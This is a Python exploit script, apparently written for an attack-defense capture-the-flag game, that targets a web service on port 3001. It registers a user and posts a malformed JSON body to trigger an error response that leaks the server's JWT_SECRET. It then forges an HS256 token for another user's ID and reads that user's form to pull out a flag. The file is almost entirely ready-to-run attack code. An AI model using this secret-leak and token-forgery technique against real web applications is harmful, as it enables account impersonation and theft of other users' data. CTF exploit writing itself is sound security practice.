from utils import *
import sys
import json
import re
import jwt

PORT = 3001


def exploit(ip, flag_id):
    client = ClientSession(ip, PORT)
    client.register()
    creds = client.export_credentials()

    r = requests.post(f"http://{ip}:{PORT}/new", data=b'{', 
                      headers={
                          'Authorization': f'Bearer {creds["token"]}',
                          'Content-Type': 'application/json'
                        })
    
    m = re.search(r'"JWT_SECRET":"(.+)",', r.text)
    if m is None:
        raise Exception("Failed to find JWT_SECRET in " + r.text)
    
    secret = m.group(1)
    print(f"Secret: {secret}")

    newtoken = jwt.encode({'id': flag_id['user_id'], 'username': 'x'}, secret, algorithm='HS256')

    r = requests.get(f'http://{ip}:{PORT}/form/{flag_id["form_id"]}', headers={'Authorization': f'Bearer {newtoken}'})

    if r.status_code != 200:
        raise Exception(f"Failed to get flag: {r.text}")
    
    m = re.search(r'[A-Z0-9]{31}=', r.text)
    if m is None:
        raise Exception("Failed to find flag in " + r.text)
    
    flag = m.group(0)
    return flag

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = json.loads(sys.argv[2])
    print(exploit(ip, flag_id))
